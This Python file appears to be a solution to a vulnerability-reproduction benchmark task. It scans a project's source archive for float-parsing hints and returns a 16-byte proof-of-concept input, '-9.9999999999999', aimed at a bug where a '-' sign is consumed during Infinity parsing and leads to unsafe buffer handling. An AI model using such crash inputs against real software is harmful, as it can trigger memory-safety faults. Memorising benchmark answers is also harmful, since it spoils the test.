import os
import re
import tarfile
import zipfile
from typing import Iterable, Optional


class Solution:
    def _iter_files_dir(self, root: str) -> Iterable[str]:
        for base, _, files in os.walk(root):
            for fn in files:
                yield os.path.join(base, fn)

    def _looks_text_source(self, name: str) -> bool:
        name_l = name.lower()
        exts = (
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".inc", ".ipp", ".inl", ".l", ".y", ".py", ".java", ".rs", ".go"
        )
        if name_l.endswith(exts):
            return True
        # Also include common build/config files which might mention Infinity
        base = os.path.basename(name_l)
        return base in (
            "cmakelists.txt", "configure.ac", "configure.in", "makefile", "makefile.am",
            "meson.build", "build.gradle", "pom.xml"
        )

    def _scan_bytes_for_hints(self, blob: bytes) -> tuple[bool, bool, bool]:
        # returns (has_infinity, has_dot_inf, has_strtod_like)
        b = blob
        has_infinity = (b"Infinity" in b) or (b"infinity" in b)
        has_dot_inf = (b".inf" in b.lower()) or (b"inff" in b.lower())
        has_strtod_like = (b"strtod" in b) or (b"strtof" in b) or (b"atof" in b)
        return has_infinity, has_dot_inf, has_strtod_like

    def _scan_archive(self, path: str) -> tuple[bool, bool, bool]:
        has_infinity = False
        has_dot_inf = False
        has_strtod_like = False

        def update(flags: tuple[bool, bool, bool]) -> None:
            nonlocal has_infinity, has_dot_inf, has_strtod_like
            hi, hdi, hs = flags
            has_infinity = has_infinity or hi
            has_dot_inf = has_dot_inf or hdi
            has_strtod_like = has_strtod_like or hs

        if os.path.isdir(path):
            scanned = 0
            for fp in self._iter_files_dir(path):
                if not self._looks_text_source(fp):
                    continue
                try:
                    st = os.stat(fp)
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    with open(fp, "rb") as f:
                        blob = f.read(256_000)
                    update(self._scan_bytes_for_hints(blob))
                    scanned += 1
                    if scanned >= 2000:
                        break
                    if has_infinity and has_strtod_like:
                        break
                except OSError:
                    continue
            return has_infinity, has_dot_inf, has_strtod_like

        lower = path.lower()
        if tarfile.is_tarfile(path):
            try:
                with tarfile.open(path, "r:*") as tf:
                    scanned = 0
                    for m in tf:
                        if not m.isreg():
                            continue
                        if not self._looks_text_source(m.name):
                            continue
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            blob = f.read(256_000)
                        except Exception:
                            continue
                        update(self._scan_bytes_for_hints(blob))
                        scanned += 1
                        if scanned >= 3000:
                            break
                        if has_infinity and has_strtod_like:
                            break
            except Exception:
                pass
            return has_infinity, has_dot_inf, has_strtod_like

        if lower.endswith(".zip") and zipfile.is_zipfile(path):
            try:
                with zipfile.ZipFile(path, "r") as zf:
                    scanned = 0
                    for zi in zf.infolist():
                        if zi.is_dir():
                            continue
                        if not self._looks_text_source(zi.filename):
                            continue
                        if zi.file_size <= 0 or zi.file_size > 2_000_000:
                            continue
                        try:
                            with zf.open(zi, "r") as f:
                                blob = f.read(256_000)
                        except Exception:
                            continue
                        update(self._scan_bytes_for_hints(blob))
                        scanned += 1
                        if scanned >= 3000:
                            break
                        if has_infinity and has_strtod_like:
                            break
            except Exception:
                pass
            return has_infinity, has_dot_inf, has_strtod_like

        return has_infinity, has_dot_inf, has_strtod_like

    def solve(self, src_path: str) -> bytes:
        has_infinity, has_dot_inf, has_strtod_like = self._scan_archive(src_path)

        # Heuristic PoC (16 bytes) targeting a bug where '-' is consumed during Infinity parsing
        # even when the value is not Infinity, leading to unsafe buffer handling.
        # Use a float-like token to encourage float parsing paths.
        if has_dot_inf and not has_strtod_like and not has_infinity:
            # Some projects (e.g., YAML-like) treat ".inf" specially; still use a normal float.
            return b"-.99999999999999"  # 16 bytes
        return b"-9.9999999999999"  # 16 bytes